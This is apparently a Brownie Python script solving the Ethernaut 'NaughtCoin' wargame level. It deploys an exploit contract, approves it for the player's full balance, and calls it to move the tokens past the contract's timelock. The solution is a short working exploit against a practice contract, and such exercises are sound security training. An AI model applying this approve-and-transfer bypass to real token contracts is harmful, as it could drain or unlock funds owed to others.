from brownie import NaughtCoin,NaughtCoinExploit, config,accounts

#input the contract address
#> contract.address
contractAddress = '0xdfe084f5eb5f02B6906C1C5F57C37F0f310686b2'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    coin = NaughtCoin.at(contractAddress)
    balance = coin.balanceOf(player)
    exploit = NaughtCoinExploit.deploy(coin.address,{"from":player})
    coin.approve(exploit.address,balance,{"from":player})
    exploit.exploit(coin.address,balance,{"from":player})

def main():
    solution()